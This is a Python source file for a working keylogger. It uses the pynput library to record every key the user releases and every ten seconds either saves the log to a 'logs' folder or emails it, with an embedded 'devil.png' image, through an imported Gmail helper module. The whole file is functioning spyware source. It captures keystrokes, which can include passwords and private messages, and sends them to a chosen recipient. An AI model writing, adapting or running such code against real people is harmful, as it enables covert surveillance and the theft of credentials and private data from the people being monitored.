from pynput.keyboard import Key, Listener
import os
import sys
from threading import Timer
from datetime import datetime
import keylogger_gmail

LOG_TIMER = 10  # seconds
is_send_email = sys.argv[1]  # If true send email, else log to file
sender = ""
to = ""
if len(sys.argv) == 4:
    sender = sys.argv[2]  # Sender's email address passed as command line argument
    to = sys.argv[3]  # Recipient's email address passed as command line argument


class Keylogger:
    def __init__(self) -> None:
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.create_report()

    def on_release(self, key):
        print(key)
        char = ""
        if key == Key.space:
            char = " "
        elif key == Key.enter:
            char = "[ENTER]\n"
        else:
            char = str(key).replace("'", "")
        self.log += char

    def create_filename(self):
        start_date = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_date = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"Keylog-{start_date}_{end_date}"

    def save_to_file(self):
        # Check if the "logs" directory exists, and if not, create it
        if not os.path.exists("logs"):
            os.makedirs("logs")

        # Save the file inside the "logs" directory
        with open(os.path.join("logs", f"{self.filename}.txt"), "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)

        print(f"[+] Saved {self.filename}.txt in the 'logs' directory")

    def create_report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.create_filename()

            if is_send_email == "true":
                keylogger_gmail.send_email_with_embedded_image(
                    sender, to, self.filename, self.log, "devil.png"
                )

            else:
                self.save_to_file()
            self.start_dt = datetime.now()

        # Reset log and timer

        self.log = ""
        timer = Timer(interval=10, function=self.create_report)
        timer.daemon = True
        timer.start()

    def start(self):
        # Start the keylogger
        with Listener(on_release=self.on_release) as l:
            l.join()


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
